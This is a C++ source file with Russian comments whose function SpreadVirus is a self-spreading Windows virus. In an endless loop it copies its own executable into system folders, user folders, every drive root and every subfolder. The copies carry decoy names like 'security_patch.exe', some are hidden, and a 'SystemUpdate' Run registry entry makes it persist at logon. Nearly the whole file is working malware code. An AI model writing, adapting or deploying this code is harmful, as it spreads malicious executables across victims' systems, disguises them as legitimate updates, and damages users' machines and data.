#include <windows.h>
#include <filesystem>
#include <string>
#include <random>
#include <chrono>

namespace fs = std::filesystem;
std::mt19937 spreadRng(std::chrono::steady_clock::now().time_since_epoch().count());

void SpreadVirus() {
    while (true) {
        try {
            // Получаем путь к текущему исполняемому файлу
            char exePath[MAX_PATH];
            GetModuleFileNameA(NULL, exePath, MAX_PATH);

            // Список папок для распространения
            std::vector<std::string> folders;

            // Системные папки
            char systemPath[MAX_PATH];
            GetSystemDirectoryA(systemPath, MAX_PATH);
            folders.push_back(systemPath);

            char windowsPath[MAX_PATH];
            GetWindowsDirectoryA(windowsPath, MAX_PATH);
            folders.push_back(windowsPath);

            // Рабочий стол
            char desktopPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopPath);
            folders.push_back(desktopPath);

            // Папка пользователя
            char userPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, userPath);
            folders.push_back(userPath);

            // Папка документов
            char docsPath[MAX_PATH];
            SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, docsPath);
            folders.push_back(docsPath);

            // Временная папка
            char tempPath[MAX_PATH];
            GetTempPathA(MAX_PATH, tempPath);
            folders.push_back(tempPath);

            // Добавляем корневые папки всех дисков
            for (char drive = 'C'; drive <= 'Z'; drive++) {
                std::string drivePath = std::string(1, drive) + ":\\";
                if (fs::exists(drivePath) && fs::is_directory(drivePath)) {
                    folders.push_back(drivePath);
                }
            }

            // Создаём 100 копий в каждой папке
            for (const auto& folder : folders) {
                if (!fs::exists(folder)) continue;

                for (int i = 0; i < 10; i++) {
                    // Генерируем случайное имя
                    std::string names[] = {
                        "system_update.exe",
                        "windows_service.exe",
                        "driver_pack.exe",
                        "critical_update.exe",
                        "security_patch.exe",
                        "network_driver.exe",
                        "performance_boost.exe",
                        "system_tools.exe",
                        "kernel_update.exe",
                        "anti_malware.exe"
                    };
                    std::string name = names[std::uniform_int_distribution<int>(0, 9)(spreadRng)];

                    // Добавляем случайную строку к имени
                    std::string randStr = std::to_string(std::uniform_int_distribution<int>(1000, 9999)(spreadRng));
                    name = name.substr(0, name.find_last_of('.')) + "_" + randStr + ".exe";

                    fs::path destPath = fs::path(folder) / name;

                    // Копируем себя
                    try {
                        fs::copy(exePath, destPath, fs::copy_options::overwrite_existing);
                    } catch (...) {}

                    // Создаём скрытые копии
                    if (std::uniform_int_distribution<int>(0, 1)(spreadRng)) {
                        fs::path hiddenPath = fs::path(folder) / ("." + name);
                        try {
                            fs::copy(exePath, hiddenPath, fs::copy_options::overwrite_existing);
                            SetFileAttributesA(hiddenPath.string().c_str(), FILE_ATTRIBUTE_HIDDEN);
                        } catch (...) {}
                    }
                }

                // Создаём копии в подпапках
                for (const auto& subEntry : fs::directory_iterator(folder)) {
                    if (fs::is_directory(subEntry)) {
                        try {
                            fs::copy(exePath, subEntry.path() / "system.exe", fs::copy_options::overwrite_existing);
                        } catch (...) {}
                    }
                }
            }

            // Создаём автозагрузку в реестре
            HKEY hKey;
            std::string keyPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            if (RegOpenKeyExA(HKEY_CURRENT_USER, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                char currentExe[MAX_PATH];
                GetModuleFileNameA(NULL, currentExe, MAX_PATH);
                RegSetValueExA(hKey, "SystemUpdate", 0, REG_SZ, (BYTE*)currentExe, strlen(currentExe));
                RegCloseKey(hKey);
            }

            Sleep(30000);
        } catch (...) {
            Sleep(10000);
        }
    }
}
